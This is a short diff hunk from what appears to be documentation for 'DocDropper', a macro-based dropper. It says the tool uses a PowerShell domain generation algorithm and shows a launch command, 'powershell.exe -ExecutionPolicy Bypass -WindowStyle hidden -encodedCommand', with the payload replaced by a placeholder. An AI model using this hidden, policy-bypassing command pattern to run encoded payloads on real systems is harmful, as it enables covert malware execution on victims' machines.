@@ -11,7 +11,7 @@ Indeed, DocDropper use a PowerShell Dynamic Generation Algorithm (DGA) to find a
 Begin by `./dropper/vector.payload.ps1` : this is the encoded payload in the active Macro.
 
 ```
-powershell.exe -ExecutionPolicy Bypass -WindowStyle hidden  -encodedCommand [code]
+powershell.exe -ExecutionPolicy Bypass -WindowStyle hidden -encodedCommand [code]
 ```
 
 ## Reminder
